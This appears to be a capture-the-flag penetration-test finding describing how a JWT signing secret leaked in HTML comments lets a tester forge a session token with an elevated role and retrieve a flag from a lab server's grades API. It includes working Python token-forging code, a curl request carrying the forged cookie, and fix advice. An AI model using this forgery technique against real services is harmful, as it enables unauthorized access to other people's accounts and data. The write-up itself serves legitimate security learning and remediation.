# Finding 02 — JWT secret disclosed in HTML comments → forged session → FLAG 1

**Target:** http://192.168.1.74:4942
**Severity:** Critical
**Status:** Confirmed exploitable
**Flag:** `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`

## Summary

Every page's HTML footer comments ("DEPLOY LOG") state:

```html
<!-- v1.2.0 — sophie — initial platform. jwt secret was "42". wil changed it to "42network". progress. -->
```

The session cookie is a HS256 JWT (`{"alg":"HS256","typ":"JWT"}`) containing
`sub`, `login`, `role`, `exp`. Signing a token with secret `"42network"` and an
arbitrary `role` is accepted by the server — confirmed by `/api/grades` and
`/agenda` flipping from `302` (redirect to `/login`, unauthenticated) to `200`
once the forged cookie is sent, even though the account used
(`jdoe`, from Finding 01) is normally role `student`.

With a forged token, `GET /api/grades` returns **all** grade records for the
`sub` in the token, including a project named "Darkly" (module: Security,
difficulty: god, `real_42: false` — clearly the CTF's own meta-project) whose
`flag` field contains the first flag.

## Steps to reproduce

1. Have any valid `sub` claim (e.g. `z4p1cnx47mfy50f` for `jdoe`, obtained via
   Finding 01's account takeover, or read your own after a normal login).
2. Forge a JWT signed with secret `42network`:

   ```python
   import jwt, time
   payload = {
       "sub": "z4p1cnx47mfy50f",
       "login": "jdoe",
       "role": "staff",
       "exp": int(time.time()) + 86400,
   }
   token = jwt.encode(payload, "42network", algorithm="HS256")
   ```

3. Send it as the session cookie:

   ```
   curl -s -H "Cookie: session=<token>" http://192.168.1.74:4942/api/grades
   ```

4. Response includes:

   ```json
   {
     "project": "i9bnu5ze2u87g5m",
     "expand": {"project": {"name": "Darkly", "module": "Security", "difficulty": "god", "real_42": false, "xp": 3000}},
     "score": 0,
     "flag": "FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}"
   }
   ```

Note: `/admin` still returns `403 {"detail":"Insufficient privileges"}` even
with `role: "admin"` or `role: "staff"` in the forged token — that endpoint
checks something else (possibly IP-restricted like `/internal/config`, or a
different claim/role string). Not yet bypassed.

## Repro script

See `repro-02-jwt-forge.py` in this directory.

## Fix recommendation

- Never disclose the signing secret anywhere client-reachable (comments, JS, headers).
- Use a long, random, rotated secret (or move to asymmetric signing).
- Validate `role` against the server-side user record on every request rather
  than trusting the JWT claim alone for authorization decisions.
